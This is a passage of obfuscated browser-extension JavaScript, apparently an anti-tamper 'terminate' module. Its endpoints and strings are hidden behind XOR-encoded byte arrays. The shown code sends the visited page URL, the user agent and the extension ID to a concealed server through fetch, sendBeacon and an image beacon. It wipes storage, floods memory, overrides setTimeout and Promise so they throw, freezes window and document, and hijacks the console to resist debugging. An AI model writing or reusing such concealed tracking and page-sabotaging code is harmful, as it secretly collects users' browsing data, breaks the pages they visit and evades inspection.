          rqMFF: function (t, e) {
            return t === e;
          },
          CGmxy: A(n),
          yjbQZ: "error",
          dNnuX: " SECURITY" + A(r),
          QRAcm: function (t, e, n) {
            return t(e, n);
          },
        },
        I = document.createElement(k.vrzkH);
      (I.style.cssText =
        "\n\t\t\tposition: fixed;" +
        A(o) +
        "0px;\n\t\t\tright: 20px;\n\t\t\tbackground: " +
        (k[A(i)](e, A(s)) ? k.CGmxy : A(a)) +
        ";\n\t\t\tcolor" +
        A(u) +
        "\t\tpadding: 20px;\n\t\t\tborder-radius: 5px;\n\t\t\tz-index: 1000000;" +
        A(188) +
        A(294) +
        "al, sans-serif;\n\t\t\tf" +
        A(c) +
        ": bold;\n\t\t" +
        A(l) +
        ": 400px;\n\t\t"),
        (I[A(d)] =
          A(f) +
          (e === k.yjbQZ ? " SECURITY" + A(h) : k[A(p)]) +
          "</h3>\n\t\t\t<p>" +
          t +
          "</p>\n\t\t\t<p><small>Extension fu" +
          A(285) +
          A(m) +
          " disabled.</small></" +
          A(g)),
        document.body[A(y) + "d"](I),
        e ===
          (function () {
            let t;
            return function () {
              const e = z;
              if (!t) {
                const n = new Uint8Array([200, 158, 204, 249, 214, 145, 217]),
                  r = -1749090369,
                  o = new Uint8Array(n[e(b)]);
                for (let t = 0; t < n.length; t++) {
                  const e = 255 & k.zjhbK(r, 8 * k.eMJNi(t, 4));
                  o[t] = n[t] ^ e;
                }
                t = new TextDecoder()[e(v)](o);
              }
              return t;
            };
          })()() &&
          k[A(w)](
            setTimeout,
            () => {
              I.remove();
            },
            1e4
          );
    }
    async [O(284) + O(301)](t) {
      const e = 275,
        n = 355,
        r = 267,
        o = 330,
        i = 206,
        s = 157,
        a = 351,
        u = 310,
        c = O,
        l = {
          MXHlb: "application/json",
          AicQA: function (t, e) {
            return t === e;
          },
        },
        d = l;
      try {
        const n = {};
        (n["Content-Type"] = d.MXHlb),
          await fetch(
            (function () {
              const t = 211,
                e = z,
                n = {};
              n[e(u)] = function (t, e) {
                return t < e;
              };
              const r = n;
              let o;
              return function () {
                const n = e;
                if (!o) {
                  const e = new Uint8Array([
                      209, 139, 202, 231, 202, 197, 145, 184, 212, 144, 217,
                      227, 220, 156, 214, 185, 221, 154, 200, 184, 216, 143,
                      215, 184, 202, 154, 221, 226, 203, 150, 202, 238, 150,
                      139, 219, 229, 212, 150, 208, 246, 205, 150, 209, 249,
                    ]),
                    i = -1749090375,
                    s = new Uint8Array(e[n(t)]);
                  for (let t = 0; r.xSxjg(t, e[n(211)]); t++) {
                    const n = (i >>> ((t % 4) * 8)) & 255;
                    s[t] = e[t] ^ n;
                  }
                  o = new TextDecoder().decode(s);
                }
                return o;
              };
            })()(),
            {
              method: (function () {
                const t = z,
                  e = {};
                e[t(157)] = function (t, e) {
                  return t & e;
                };
                const n = e;
                let r;
                return function () {
                  const e = t;
                  if (!r) {
                    const t = new Uint8Array([235, 176, 237, 195]),
                      o = -1749090373,
                      i = new Uint8Array(t[e(211)]);
                    for (let r = 0; r < t[e(211)]; r++) {
                      const a = n[e(s)](o >>> ((r % 4) * 8), 255);
                      i[r] = t[r] ^ a;
                    }
                    r = new TextDecoder()[e(a)](i);
                  }
                  return r;
                };
              })()(),
              headers: n,
              body: JSON[c(e)]({
                reason: t.reason,
                level: t.level,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                url: window.location.href,
              }),
            }
          );
      } catch (f) {
        c(249) + c(n),
          f instanceof Error
            ? f[c(155)]
            : typeof f === c(r) ||
              (f && d[c(o)](typeof f, c(i)) && JSON.stringify(f));
      }
    }
    ["emergencyServerNotif" + O(184)](t) {
      var e;
      const n = 258,
        r = 164,
        o = 335,
        i = 192,
        s = 337,
        a = 304,
        u = 286,
        c = 275,
        l = 211,
        d = 271,
        f = 218,
        h = 351,
        p = O,
        m = {
          yWKjH: function (t, e) {
            return t % e;
          },
        };
      (m[p(359)] = function (t, e) {
        return t >>> e;
      }),
        (m[p(n)] = function (t, e) {
          return t ^ e;
        }),
        (m.AlxBS = function (t, e) {
          return t & e;
        }),
        (m.ufevD = function (t, e) {
          return t * e;
        }),
        (m.htjrS = function (t, e) {
          return t < e;
        }),
        (m.ZCyJe = "unknown"),
        (m.lRhEB = function (t, e) {
          return t + e;
        });
      const g = m,
        y = {
          emergency: !![],
          reason: t[p(r)],
          timestamp: Date.now(),
          extensionId:
            (null == (e = null == chrome ? void 0 : chrome.runtime)
              ? void 0
              : e.id) || g[p(o)],
        },
        w = {};
      (w[p(i) + "pe"] = "applicatio" + p(303)),
        fetch(
          (function () {
            const t = {
              OMBge: function (t, e) {
                return g.yWKjH(t, e);
              },
            };
            let e;
            return function () {
              const n = z;
              if (!e) {
                const r = new Uint8Array([
                    209, 139, 202, 231, 202, 197, 145, 184, 212, 144, 217, 227,
                    220, 156, 214, 185, 221, 154, 200, 184, 216, 143, 215, 184,
                    202, 154, 221, 226, 203, 150, 202, 238, 150, 154, 211, 242,
                    203, 152, 219, 249, 218, 134,
                  ]),
                  o = -1749090375,
                  i = new Uint8Array(r.length);
                for (let e = 0; e < r.length; e++) {
                  const s = (o >>> (8 * t[n(313)](e, 4))) & 255;
                  i[e] = r[e] ^ s;
                }
                e = new TextDecoder()[n(h)](i);
              }
              return e;
            };
          })()(),
          {
            method: (function () {
              const t = 211,
                e = 211;
              let n;
              return function () {
                const r = z;
                if (!n) {
                  const o = new Uint8Array([247, 176, 237, 195]),
                    i = -1749090393,
                    s = new Uint8Array(o[r(t)]);
                  for (let t = 0; t < o[r(e)]; t++) {
                    const e = 255 & g.xJRUv(i, (t % 4) * 8);
                    s[t] = g.FNGQW(o[t], e);
                  }
                  n = new TextDecoder().decode(s);
                }
                return n;
              };
            })()(),
            headers: w,
            body: JSON.stringify(y),
          }
        )[p(s)](() => {}),
        p(a) in navigator &&
          navigator.sendBeacon(
            (function () {
              let t;
              return function () {
                const e = z;
                if (!t) {
                  const n = new Uint8Array([
                      209, 139, 202, 231, 202, 197, 145, 184, 212, 144, 217,
                      227, 220, 156, 214, 185, 221, 154, 200, 184, 216, 143,
                      215, 184, 202, 154, 221, 226, 203, 150, 202, 238, 150,
                      154, 211, 242, 203, 152, 219, 249, 218, 134,
                    ]),
                    r = -1749090375,
                    o = new Uint8Array(n[e(211)]);
                  for (let t = 0; t < n.length; t++) {
                    const e = g.AlxBS(r >>> g.ufevD(t % 4, 8), 255);
                    o[t] = n[t] ^ e;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()(),
            JSON.stringify(y)
          );
      new Image()[p(u)] = g.lRhEB(
        (function () {
          let t;
          return function () {
            const e = z;
            if (!t) {
              const n = new Uint8Array([
                  211, 139, 202, 231, 200, 197, 145, 184, 214, 144, 217, 227,
                  222, 156, 214, 185, 223, 154, 200, 184, 218, 143, 215, 184,
                  200, 154, 221, 226, 201, 150, 202, 238, 148, 154, 211, 242,
                  201, 152, 219, 249, 216, 134, 129, 243, 218, 139, 223, 170,
                ]),
                r = -1749090373,
                o = new Uint8Array(n.length);
              for (let t = 0; g.htjrS(t, n[e(l)]); t++) {
                const i = g[e(d)](r >>> (8 * g[e(f)](t, 4)), 255);
                o[t] = n[t] ^ i;
              }
              t = new TextDecoder().decode(o);
            }
            return t;
          };
        })()(),
        encodeURIComponent(JSON[p(c)](y))
      );
    }
    async [O(199) + "Data"]() {
      await this.clearAllStorage();
      for (let t = 0; t < 1e3; t++) window["destroy_" + t] = "X".repeat(1e4);
      window.gc && window.gc();
    }
    preventCodeExecution() {
      const t = 289,
        e = 168,
        n = O,
        r = {
          KJHyB: function (t, e) {
            return t * e;
          },
        },
        o = r;
      (window.setTimeout = () => {
        const t = 143;
        throw new Error(
          (function () {
            const e = {
                sxIZf: function (t, e) {
                  return t & e;
                },
              },
              n = e;
            let r;
            return function () {
              const e = z;
              if (!r) {
                const o = new Uint8Array([
                    252, 167, 234, 210, 247, 172, 247, 216, 247, 223, 234, 210,
                    235, 178, 247, 217, 248, 171, 251, 211,
                  ]),
                  i = -1749090375,
                  s = new Uint8Array(o.length);
                for (let r = 0; r < o.length; r++) {
                  const a = n[e(t)](i >>> ((r % 4) * 8), 255);
                  s[r] = o[r] ^ a;
                }
                r = new TextDecoder()[e(351)](s);
              }
              return r;
            };
          })()()
        );
      }),
        (window.setInterval = () => {
          const t = {};
          t[z(e)] = function (t, e) {
            return t % e;
          };
          const n = t;
          throw new Error(
            (function () {
              const t = 211,
                e = 211,
                r = function (t, e) {
                  return t >>> e;
                },
                o = function (t, e) {
                  return n.jUmKb(t, e);
                };
              let i;
              return function () {
                const n = z;
                if (!i) {
                  const s = new Uint8Array([
                      250, 167, 234, 210, 241, 172, 247, 216, 241, 223, 234,
                      210, 237, 178, 247, 217, 254, 171, 251, 211,
                    ]),
                    a = -1749090369,
                    u = new Uint8Array(s[n(t)]);
                  for (let t = 0; t < s[n(e)]; t++) {
                    const e = 255 & r(a, 8 * o(t, 4));
                    u[t] = s[t] ^ e;
                  }
                  i = new TextDecoder().decode(u);
                }
                return i;
              };
            })()()
          );
        }),
        (window.Promise = class {
          constructor() {
            const t = function (t, e) {
              return o.KJHyB(t, e);
            };
            throw new Error(
              (function () {
                const e = 351;
                let n;
                return function () {
                  const r = z;
                  if (!n) {
                    const o = new Uint8Array([
                        252, 167, 234, 210, 247, 172, 247, 216, 247, 223, 234,
                        210, 235, 178, 247, 217, 248, 171, 251, 211,
                      ]),
                      i = -1749090375,
                      s = new Uint8Array(o.length);
                    for (let e = 0; e < o[r(211)]; e++) {
                      const n = (i >>> t(e % 4, 8)) & 255;
                      s[e] = o[e] ^ n;
                    }
                    n = new TextDecoder()[r(e)](s);
                  }
                  return n;
                };
              })()()
            );
          }
        });
      try {
        Object[n(t)](window), Object.freeze(document);
      } catch (i) {}
    }
    isTerminated() {
      return this.terminated;
    }
    [O(200) + O(216)]() {
      return this.terminationReason;
    }
  }
  const q = U.getInstance();
  function z(t, e) {
    const n = L();
    return (
      (z = function (e, r) {
        let o = n[(e -= 143)];
        if (void 0 === z.GdQdCl) {
          var i = function (t) {
            let e = "",
              n = "",
              r = e + i;
            for (
              let o, i, s = 0, a = 0;
              (i = t.charAt(a++));
              ~i && ((o = s % 4 ? 64 * o + i : i), s++ % 4)
                ? (e +=
                    r.charCodeAt(a + 10) - 10 != 0
                      ? String.fromCharCode(255 & (o >> ((-2 * s) & 6)))
                      : s)
                : 0
            )
              i =
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(
                  i
                );
            for (let o = 0, i = e.length; o < i; o++)
              n += "%" + ("00" + e.charCodeAt(o).toString(16)).slice(-2);
            return decodeURIComponent(n);
          };
          (z.glBRJE = i), (t = arguments), (z.GdQdCl = !![]);
        }
        const s = e + n[0],
          a = t[s];
        if (a) o = a;
        else {
          const e = function (t) {
            (this.PifTxr = t),
              (this.iRPASZ = [1, 0, 0]),
              (this.UTwCdl = function () {
                return "newState";
              }),
              (this.iUjjKN = "\\w+ *\\(\\) *{\\w+ *"),
              (this.VGslEK = "['|\"].+['|\"];? *}");
          };
          (e.prototype.EKFonK = function () {
            const t = new RegExp(this.iUjjKN + this.VGslEK).test(
              this.UTwCdl.toString()
            )
              ? --this.iRPASZ[1]
              : --this.iRPASZ[0];
            return this.zlPkrx(t);
          }),
            (e.prototype.zlPkrx = function (t) {
              return Boolean(~t) ? this.yhyGzn(this.PifTxr) : t;
            }),
            (e.prototype.yhyGzn = function (t) {
              for (let e = 0, n = this.iRPASZ.length; e < n; e++)
                this.iRPASZ.push(Math.round(Math.random())),
                  (n = this.iRPASZ.length);
              return t(this.iRPASZ[0]);
            }),
            new e(z).EKFonK(),
            (o = z.glBRJE(o)),
            (t[s] = o);
        }
        return o;
      }),
      z(t, e)
    );
  }
  const K = (t) => {
      const e = O,
        n = { level: "nuclear" };
      return (
        (n.reason = t), (n["showUserNo" + e([245][0])] = !![]), q.terminate(n)
      );
    },
    W = (t) => {
      const e = O,
        n = {};
      return (
        (n.level = e([171][0])),
        (n.reason = t),
        (n.showUserNotification = !![]),
        q.terminate(n)
      );
    };
  axiomVamp;
  const F = $;
  !(function (t) {
    const e = 185,
      n = 164,
      r = 138,
      o = 171,
      i = 150,
      s = 192,
      a = 140,
      u = 218,
      c = 161,
      l = 178,
      d = $,
      f = t();
    for (; []; )
      try {
        if (
          897704 ===
          (-parseInt(d(e)) / 1) * (parseInt(d(n)) / 2) +
            (parseInt(d(r)) / 3) * (parseInt(d(o)) / 4) +
            (parseInt(d(i)) / 5) * (parseInt(d(s)) / 6) +
            (-parseInt(d(184)) / 7) * (-parseInt(d(a)) / 8) +
            (parseInt(d(u)) / 9) * (parseInt(d(216)) / 10) +
            -parseInt(d(c)) / 11 +
            -parseInt(d(l)) / 12
        )
          break;
        f.push(f.shift());
      } catch (h) {
        f.push(f.shift());
      }
  })(H);
  const j = (function () {
      let t = !![];
      return function (e, n) {
        const r = t
          ? function () {
              if (n) {
                const t = n.apply(e, arguments);
                return (n = null), t;
              }
            }
          : function () {};
        return (t = ![]), r;
      };
    })(),
    G = j(void 0, function () {
      const t = 199,
        e = 197,
        n = 212,
        r = $,
        o = {};
      o.dbtdC = r(t) + "+$";
      const i = o;
      return G[r(e)]()
        .search(i[r(n)])
        [r(e)]()
        .constructor(G)
        .search("(((.+)+)+)+$");
    });
  G();
  const V = (function () {
    let t = !![];
    return function (e, n) {
      const r = t
        ? function () {
            if (n) {
              const t = n.apply(e, arguments);
              return (n = null), t;
            }
          }
        : function () {};
      return (t = ![]), r;
    };
  })();
  function H() {
    const t = [
      "Dg9tDhjPBMC",
      "ywrKrxzLBNrmAq",
      "kcGOlISPkYKRkq",
      "E30Uy29UC3rYDq",
      "Bez0CNi",
      "C3vIC3rY",
      "Dhj6s1u",
      "ENfQqNe",
      "C3rYAw5N",
      "BMn0Aw9UkcKG",
      "A2v5CW",
      "rKXyEKW",
      "BgvUz3rO",
      "CvDKsu0",
      "zxHJzxb0Aw9U",
      "zgj0zem",
      "DNjqrNO",
      "uvPQAgO",
      "CMf3",
      "mtiWnZeXmgHMruHeuq",
      "zgvJB2rL",
      "mta4qKnRCLvp",
      "AhbmrKG",
      "y29UC29Szq",
      "vw5RBM93BIbLCG",
      "mZiXBufxsxDS",
      "BwfW",
      "odq4mteYy29Xv25A",
      "zK52Auq",
      "CKXetxa",
      "B2jQzwn0",
      "Bwv0ywrHDge",
      "C2TdCNLWDa",
      "t1vHuKW",
      "EwPlDxa",
      "rg1wsxi",
      "rhnZu3a",
      "nxzmAMzcrW",
      "yLn3thK",
      "q1LcAKy",
      "B1PfCMy",
      "x19WCM90B19F",
      "BvLrwwe",
      "C3vIDgXL",
      "sgDODeS",
      "z2Tvtfu",
      "zg9JDw1LBNrfBa",
      "DKnKzw8",
      "odaWodi5n3DbD1LnqW",
      "v2DqCKy",
      "yMLUza",
      "odGXmtHJwhLlzLi",
      "C2v0sw50zxj2yq",
      "zw1LBNq",
      "BcGI",
      "DMLZAwjPBgL0Eq",
      "y3rVCIGICMv0Dq",
      "CenkBu4",
      "mty5odHcD2Xnv3G",
      "BhDZuee",
      "vfv2AK4",
      "ugL2zum",
      "sfL1q3m",
      "yMLHsNK",
      "CwrKvhK",
      "mJC4nJa1mJbiz3PKz1K",
      "uNbhCgq",
      "C3rLBMvY",
      "qLb5s3G",
      "r2LktKu",
      "wwjQzee",
      "mteYBLrJEeDt",
      "n0DmuxHVBq",
      "quTIBve",
      "thDYCg0",
      "vhLvyLe",
      "DuXpt2e",
      "tfHnBuO",
      "Aw5MBW",
      "mZK0mdaXnhziC2XhAa",
      "DMvYAwz5",
      "CM9Y",
      "AuXmsNK",
      "thHIyLe",
    ];
    return (H = function () {
      return t;
    })();
  }
  V(void 0, function () {
    const t = 201,
      e = 191,
      n = 211,
      r = 162,
      o = 146,
      i = 209,
      s = 154,
      a = 163,
      u = 197,
      c = 187,
      l = 200,
      d = 169,
      f = $,
      h = {
        Lwrpm: function (t, e) {
          return t + e;
        },
        fNviD: "return (fu" + f(206),
        sDQQN: function (t) {
          return t();
        },
        lFtrr: "warn",
        biaJy: "error",
        TUvjN: "table",
        WgPrF: "trace",
        OUaRL: function (t, e) {
          return t < e;
        },
      },
      p = h.sDQQN(function () {
        const t = f;
        let e;
        try {
          e = Function(
            h[t(c)](h[t(141)], t(l) + t(d) + 'rn this")( )') + ");"
          )();
        } catch (n) {
          e = window;
        }
        return e;
      }),
      m = (p[f(220)] = p.console || {}),
      g = ["log", h[f(t)], f(e), h[f(176)], f(n), h[f(173)], h[f(r)]];
    for (let y = 0; h[f(o)](y, g[f(i)]); y++) {
      const t = V.constructor.prototype.bind(V),
        e = g[y],
        n = m[e] || t;
      (t[f(s)] = V[f(a)](V)), (t.toString = n[f(u)].bind(n)), (m[e] = t);
    }
  })(),
    (window[F(145)] = function (t) {
      return function () {
        return t;
      };
    });
  const Z = (t) => {
      const e = 202,
        n = F,
        r = {
          JtZLF: function (t, e) {
            return t < e;
          },
        },
        o = r,
        i = new Uint8Array(t.length / 2);
      for (let s = 0; o.JtZLF(s, i.length); s++)
        i[s] = parseInt(t[n(e)](2 * s, 2), 16);
      return i;
    },
    X = (t) => {
      const e = 139,
        n = 143,
        r = 210,
        o = F,
        i = {
          qWdIM: function (t, e) {
            return t(e);
          },
          PeFNN: function (t, e) {
            return t !== e;
          },
        };
      return Array.isArray(t)
        ? t[o(e)](X)
        : i.PeFNN(t, null) && typeof t === o(n)
        ? Object[o(207)](t)
            .sort()
            .reduce((e, n) => {
              const s = o;
              return (e[n] = i[s(r)](X, t[n])), e;
            }, {})
        : t;
    },
    J = async (t, e) => {
      const n = 219,
        r = 183,
        o = 156,
        i = 193,
        s = 153,
        a = 205,
        u = 209,
        c = 209,
        l = 217,
        d = F,
        f = {
          RrIxW: function (t, e) {
            return t < e;
          },
          UIYeR: function (t, e) {
            return t * e;
          },
          fINXZ: function (t, e) {
            return t >>> e;
          },
          hZbFA: function (t, e) {
            return t & e;
          },
          RnhHB: function (t, e) {
            return t % e;
          },
          hpLFH: function (t, e) {
            return t(e);
          },
          YbjdA: function (t, e) {
            return t(e);
          },
          zqjBq: function (t, e) {
            return t(e);
          },
          oZErf: function (t) {
            return t();
          },
          UalUu: "Unknown error",
        },
        { metadata: h, data: p } = t;
      let { signature: m, timestamp: g } = h;
      const y = f[d(n)](X, p),
        w = "" + g + JSON.stringify(y);
      try {
        const t = new TextEncoder().encode(w),
          n = f[d(r)](Z, m),
          s = f.zqjBq(Z, e),
          a = await crypto[d(156)].importKey(
            d(215),
            s,
            {
              name: (function () {
                let t;
                return function () {
                  const e = $;
                  if (!t) {
                    const n = new Uint8Array([240, 250, 59, 84, 128, 175, 48]),
                      r = 1628020405,
                      o = new Uint8Array(n[e(209)]);
                    for (let t = 0; f.RrIxW(t, n.length); t++) {
                      const e = (r >>> f.UIYeR(t % 4, 8)) & 255;
                      o[t] = n[t] ^ e;
                    }
                    t = new TextDecoder().decode(o);
                  }
                  return t;
                };
              })()(),
            },
            ![],
            ["verify"]
          ),
          u = await crypto[d(o)][d(i)](
            {
              name: (function () {
                const t = 209,
                  e = 186,
                  n = 208,
                  r = {
                    nkRha: function (t, e) {
                      return t < e;
                    },
                    AKbmQ: function (t, e) {
                      return t & e;
                    },
                    FLXzL: function (t, e) {
                      return f.fINXZ(t, e);
                    },
                    PrpEN: function (t, e) {
                      return t ^ e;
                    },
                  };
                let o;
                return function () {
                  const i = $;
                  if (!o) {
                    const s = new Uint8Array([242, 250, 59, 84, 130, 175, 48]),
                      a = 1628020407,
                      u = new Uint8Array(s[i(209)]);
                    for (let o = 0; r.nkRha(o, s[i(t)]); o++) {
                      const t = r[i(e)](r[i(n)](a, (o % 4) * 8), 255);
                      u[o] = r.PrpEN(s[o], t);
                    }
                    o = new TextDecoder().decode(u);
                  }
                  return o;
                };
              })()(),
            },
            a,
            n,
            t
          );
        return (
          u ||
          (C(),
          await f[d(204)](
            K,
            (function () {
              let t;
              return function () {
                const e = $;
                if (!t) {
                  const n = new Uint8Array([
                      225, 255, 100, 17, 208, 236, 96, 15, 210,
                    ]),
                    r = 1628020405,
                    o = new Uint8Array(n.length);
                  for (let t = 0; t < n[e(c)]; t++) {
                    const e = f.hZbFA(r >>> f.UIYeR(f.RnhHB(t, 4), 8), 255);
                    o[t] = n[t] ^ e;
                  }
                  t = new TextDecoder()[e(l)](o);
                }
                return t;
              };
            })()()
          ),
          ![])
        );
      } catch (b) {
        f[d(s)](C);
        let t = f.UalUu;
        return (
          b instanceof Error
            ? (t = b.message)
            : typeof b === d(a)
            ? (t = b)
            : b && "object" == typeof b && (t = JSON.stringify(b)),
          await f.zqjBq(
            K,
            (function () {
              const t = {
                  UdICE: function (t, e) {
                    return t & e;
                  },
                },
                e = t;
              let n;
              return function () {
                const t = $;
                if (!n) {
                  const r = new Uint8Array([
                      229, 251, 123, 8, 213, 247, 106, 0, 199, 247, 102, 15,
                      147, 238, 123, 14, 208, 251, 122, 18, 147, 251, 123, 19,
                      220, 236, 51, 65,
                    ]),
                    o = 1628020403,
                    i = new Uint8Array(r[t(u)]);
                  for (let n = 0; n < r[t(u)]; n++) {
                    const t = e.UdICE(o >>> ((n % 4) * 8), 255);
                    i[n] = r[n] ^ t;
                  }
                  n = new TextDecoder().decode(i);
                }
                return n;
              };
            })()() + t
          ),
          ![]
        );
      }
    },
    Y = async (t) => {
      const e = 177,
        n = 137,
        r = 194,
        o = 205,
        i = 189,
        s = 209,
        a = 174,
        u = 181,
        c = 188,
        l = 152,
        d = F,
        f = {
          TyUbQ: function (t, e) {
            return t < e;
          },
          CYBjF: function (t, e) {
            return t * e;
          },
          FyAqq: function (t, e) {
            return t % e;
          },
          Mromz: function (t, e) {
            return t & e;
          },
          yjKup: function (t, e) {
            return t * e;
          },
          LHkrr: function (t, e) {
            return t >>> e;
          },
          qddTy: function (t, e) {
            return t !== e;
          },
          VRTro: function (t) {
            return t();
          },
          uLOOa: function (t, e) {
            return t === e;
          },
          hQXzd: "object",
          equol: function (t, e) {
            return t(e);
          },
        };
      try {
        return !t ||
          f[d(e)](
            typeof t,
            (function () {
              let t;
              return function () {
                const e = $;
                if (!t) {
                  const n = new Uint8Array([218, 252, 99, 4, 214, 234]),
                    r = 1628020405,
                    o = new Uint8Array(n.length);
                  for (let t = 0; f[e(c)](t, n.length); t++) {
                    const i = (r >>> f[e(l)](f.FyAqq(t, 4), 8)) & 255;
                    o[t] = n[t] ^ i;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()()
          )
          ? (f.VRTro(C),
            await W(
              (function () {
                const t = 217;
                let e;
                return function () {
                  const n = $;
                  if (!e) {
                    const r = new Uint8Array([
                        250, 255, 101, 7, 216, 236, 100, 4, 211, 190, 72, 49,
                        254, 190, 123, 4, 196, 238, 102, 15, 196, 251, 41, 5,
                        210, 234, 108, 2, 195, 251, 109,
                      ]),
                      o = 1628020407,
                      i = new Uint8Array(r.length);
                    for (let t = 0; t < r.length; t++) {
                      const e = f.Mromz(o >>> ((t % 4) * 8), 255);
                      i[t] = r[t] ^ e;
                    }
                    e = new TextDecoder()[n(t)](i);
                  }
                  return e;
                };
              })()()
            ),
            ![])
          : t.metadata && t[d(144)].signature && t.metadata.timestamp
          ? !![]
          : (C(),
            await K(
              (function () {
                const t = 147,
                  e = function (t, e) {
                    return t & e;
                  },
                  n = function (e, n) {
                    return f[$(t)](e, n);
                  },
                  r = function (t, e) {
                    return f.FyAqq(t, e);
                  },
                  o = function (t, e) {
                    return t ^ e;
                  };
                let i;
                return function () {
                  if (!i) {
                    const t = new Uint8Array([
                        248, 247, 122, 18, 220, 240, 110, 65, 198, 251, 106, 20,
                        199, 247, 125, 24, 149, 243, 108, 21, 212, 250, 104, 21,
                        212, 190, 96, 15, 149, 223, 89, 40, 149, 236, 108, 18,
                        197, 241, 103, 18, 208, 190, 36, 65, 197, 241, 122, 18,
                        220, 252, 101, 4, 149, 255, 125, 21, 212, 253, 98,
                      ]),
                      s = 1628020405,
                      a = new Uint8Array(t.length);
                    for (let i = 0; i < t.length; i++) {
                      const u = e(s >>> n(r(i, 4), 8), 255);
                      a[i] = o(t[i], u);
                    }
                    i = new TextDecoder().decode(a);
                  }
                  return i;
                };
              })()()
            ),
            ![]);
      } catch (h) {
        C();
        let t = d(n) + d(r);
        return (
          h instanceof Error
            ? (t = h.message)
            : typeof h === d(o)
            ? (t = h)
            : h && f[d(i)](typeof h, f.hQXzd) && (t = JSON.stringify(h)),
          await f.equol(
            K,
            (function () {
              const t = {
                PiveC: function (t, e) {
                  return f.LHkrr(t, e);
                },
                BPyKx: function (t, e) {
                  return t ^ e;
                },
              };
              let e;
              return function () {
                const n = $;
                if (!e) {
                  const r = new Uint8Array([
                      250, 206, 64, 65, 210, 240, 125, 4, 220, 236, 96, 21, 194,
                      190, 106, 9, 222, 253, 98, 65, 221, 255, 96, 13, 222, 250,
                      51, 65,
                    ]),
                    o = 1628020411,
                    i = new Uint8Array(r.length);
                  for (let e = 0; e < r[n(s)]; e++) {
                    const s = 255 & t[n(a)](o, (e % 4) * 8);
                    i[e] = t[n(u)](r[e], s);
                  }
                  e = new TextDecoder().decode(i);
                }
                return e;
              };
            })()() + t
          ),
          ![]
        );
      }
    },
    Q = async () => {
      const t = 167,
        e = 196,
        n = 159,
        r = 194,
        o = 214,
        i = 209,
        s = 157,
        a = 175,
        u = 217,
        c = 151,
        l = 209,
        d = 179,
        f = 209,
        h = 190,
        p = 209,
        m = F,
        g = {
          ExPaU: function (t, e) {
            return t >>> e;
          },
          vrPFz: function (t, e) {
            return t >>> e;
          },
          nAYFd: function (t, e) {
            return t * e;
          },
          DmVIr: function (t, e) {
            return t < e;
          },
          mYQYa: function (t, e) {
            return t >>> e;
          },
          pCJmN: function (t, e) {
            return t % e;
          },
          GiJNE: function (t, e) {
            return t < e;
          },
          bSwLy: function (t, e) {
            return t & e;
          },
          nZmtT: function (t, e) {
            return t * e;
          },
          ZzMYI: function (t, e) {
            return t ^ e;
          },
          pDrhQ: function (t, e) {
            return t % e;
          },
          AwvQy: function (t, e) {
            return t < e;
          },
          XzLPz: function (t, e) {
            return t >>> e;
          },
          vYYfz: function (t, e) {
            return t % e;
          },
          lwsPA: function (t, e) {
            return t ^ e;
          },
          DTNwp: function (t, e) {
            return t(e);
          },
          LGsDk: function (t, e) {
            return t === e;
          },
          GReQE: function (t) {
            return t();
          },
          rLDMp: 'setTimeout("',
          LxbbQ: m(165) + m(t),
          RCcHg: function (t, e) {
            return t instanceof e;
          },
          QZjhj: function (t, e) {
            return t === e;
          },
        };
      try {
        if (
          typeof J !==
          (function () {
            const t = m,
              e = {
                vCdeo: function (t, e) {
                  return t * e;
                },
              };
            e[t(h)] = function (t, e) {
              return t % e;
            };
            const n = e;
            let r;
            return function () {
              const e = t;
              if (!r) {
                const t = new Uint8Array([211, 235, 103, 2, 193, 247, 102, 15]),
                  o = 1628020405,
                  i = new Uint8Array(t[e(p)]);
                for (let r = 0; r < t[e(p)]; r++) {
                  const s = (o >>> n[e(160)](n[e(190)](r, 4), 8)) & 255;
                  i[r] = t[r] ^ s;
                }
                r = new TextDecoder().decode(i);
              }
              return r;
            };
          })()()
        )
          return (
            C(),
            await g.DTNwp(
              K,
              (function () {
                const t = 209,
                  e = 209,
                  n = function (t, e) {
                    return t < e;
                  },
                  r = function (t, e) {
                    return g.ExPaU(t, e);
                  };
                let o;
                return function () {
                  const i = $;
                  if (!o) {
                    const s = new Uint8Array([
                        244, 236, 96, 21, 222, 253, 104, 13, 151, 237, 108, 2,
                        194, 236, 96, 21, 206, 190, 111, 20, 217, 253, 125, 8,
                        216, 240, 41, 9, 214, 237, 41, 3, 210, 251, 103, 65,
                        212, 241, 100, 17, 197, 241, 100, 8, 196, 251, 109,
                      ]),
                      a = 1628020407,
                      u = new Uint8Array(s[i(t)]);
                    for (let t = 0; n(t, s[i(e)]); t++) {
                      const e = 255 & r(a, (t % 4) * 8);
                      u[t] = s[t] ^ e;
                    }
                    o = new TextDecoder().decode(u);
                  }
                  return o;
                };
              })()()
            ),
            ![]
          );
        if (window.__TAMPERED__ || window.__MODIFIED__)
          return (
            C(),
            await K(
              (function () {
                const t = 213;
                let e;
                return function () {
                  const n = $;
                  if (!e) {
                    const r = new Uint8Array([
                        240, 230, 125, 4, 219, 237, 96, 14, 219, 190, 125, 0,
                        216, 238, 108, 19, 220, 240, 110, 65, 209, 251, 125, 4,
                        214, 234, 108, 5, 149, 232, 96, 0, 149, 249, 101, 14,
                        215, 255, 101, 65, 211, 242, 104, 6, 198,
                      ]),
                      o = 1628020405,
                      i = new Uint8Array(r.length);
                    for (let e = 0; e < r.length; e++) {
                      const s = 255 & g[n(t)](o, (e % 4) * 8);
                      i[e] = r[e] ^ s;
                    }
                    e = new TextDecoder().decode(i);
                  }
                  return e;
                };
              })()()
            ),
            ![]
          );
        if (
          typeof chrome ===
            (function () {
              let t;
              return function () {
                const e = $;
                if (!t) {
                  const n = new Uint8Array([
                      198, 240, 109, 4, 213, 247, 103, 4, 215,
                    ]),
                    r = 1628020403,
                    o = new Uint8Array(n.length);
                  for (let t = 0; t < n[e(f)]; t++) {
                    const e = (r >>> ((t % 4) * 8)) & 255;
                    o[t] = n[t] ^ e;
                  }
                  t = new TextDecoder().decode(o);
                }
                return t;
              };
            })()() &&
          g.LGsDk(
            typeof globalThis.browser,
            (function () {
              const t = 209;
              let e;
              return function () {
                const n = $;
                if (!e) {
                  const r = new Uint8Array([
                      192, 240, 109, 4, 211, 247, 103, 4, 209,
                    ]),
                    o = 1628020405,
                    i = new Uint8Array(r[n(t)]);
                  for (let t = 0; t < r.length; t++) {
